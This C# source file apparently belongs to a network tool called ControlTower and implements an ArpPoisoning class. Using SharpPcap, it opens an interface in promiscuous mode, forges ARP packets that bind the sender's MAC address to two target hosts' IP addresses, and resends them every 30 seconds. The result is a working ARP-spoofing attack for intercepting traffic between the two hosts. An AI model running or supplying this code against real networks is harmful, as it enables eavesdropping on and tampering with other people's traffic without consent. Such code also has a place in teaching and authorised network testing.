using ControlTower.Network.Common;
using ControlTower.Network.Data;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using System;
using System.Net;
using System.Net.NetworkInformation;

namespace ControlTower
{
    public class ArpPoisoning : Threadable
    {
        public ArpPoisoning(Host target1, Host target2)
        {
            this.Target1 = target1;
            this.Target2 = target2;
        }

        public LibPcapLiveDevice Device
        {
            get;
            set;
        }

        protected override void OnStarting()
        {
            if (Target1.IpAddress.Equals(Target2.IpAddress))
                throw new Exception("Targets can't be same");

            _device = LibPcapLiveDeviceList.New()[Device.Name];
        }

        public Host Target1 { get; }

        public Host Target2 { get; }

        protected override void Run()
        {
            _device.Open(DeviceMode.Promiscuous, 50);

            // Création de de l'entrée.
            Packet arp_a = CreateArpPacket(Target1.IpAddress, Target2.IpAddress, Target2.MacAddress);
            Packet arp_b = CreateArpPacket(Target2.IpAddress, Target1.IpAddress, Target1.MacAddress);

            while (!StopAsked)
            {
                _device.SendPacket(arp_a);
                _device.SendPacket(arp_b);

                for (int i = 0; i < 30*2 && !StopAsked; ++i) // 30 secs
                    System.Threading.Thread.Sleep(WaitingThread/2);
            }

            _device.Close();
        }

        private Packet CreateArpPacket(IPAddress usurpationIpAddress, IPAddress targetIpAddress,
                                         PhysicalAddress targetPhysicalAddress)
        {
            var arpPacket = new ARPPacket(ARPOperation.Request, PhysicalAddress.Parse("000000000000"), targetIpAddress, _device.MacAddress, usurpationIpAddress);

            return new EthernetPacket(_device.MacAddress, targetPhysicalAddress, EthernetPacketType.Arp) { PayloadPacket = arpPacket };
        }

        private ICaptureDevice _device;
    }
}
